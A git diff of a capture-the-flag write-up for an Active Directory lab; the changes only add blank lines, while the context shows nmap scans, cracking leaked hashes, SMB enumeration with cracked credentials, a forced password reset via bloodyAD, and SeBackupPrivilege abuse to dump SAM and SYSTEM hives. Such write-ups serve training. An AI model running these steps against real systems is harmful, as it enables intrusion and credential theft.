@@ -61,6 +61,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
 ```
 The scan shows the usual `AD` ports open, plus a web server is running.
+
 Then, I go for an aggressive scan (`-A`) against the open ports:
 ```bash
 nmap -A -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,8080 10.0.29.68 -o nmap-scan.log
@@ -133,6 +134,7 @@ The web server is just the default Microsoft IIS server page.
 ## Hash Cracking
 
 We were given a leaked database file with potential usernames and password hashes.
+
 The go-to utility for me when cracking hashes is [CrackStation](crackstation.net):
 ![image1.png](bm-images/image1.png)
 
@@ -172,6 +174,7 @@ SMB         10.0.29.68      445    DC01             [+] BUILDINGMAGIC.LOCAL\r.wi
 ## SMB Enumeration
 
 One of the first things I usually do when solving AD labs is enumerate SMB.
+
 First, I check for guest / anonymous login. This time around, I discovered valid domain creds, so I went with that:
 ```bash
 nxc smb 10.0.29.68 -u r.widdleton -p 'lilronron' --shares
@@ -265,6 +268,7 @@ Another user compromised!
 
 ### Compromising the `h.potch` User
 The `r.haggard` user has an outbound object control (change password) over the `h.potch` user.
+
 I used `bloodyAD` to change the password of the `h.potch` user:
 ```bash
 bloodyAD -d buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --dc-ip 10.0.29.68 set password h.potch 123456  
@@ -410,6 +414,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 The user has `SeBackupPrivilege` enabled.
+
 You can learn more about this privilege and how to exploit it, here: [SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md)
 
 I used this privilege to back up the SAM & SYSTEM registry hives:
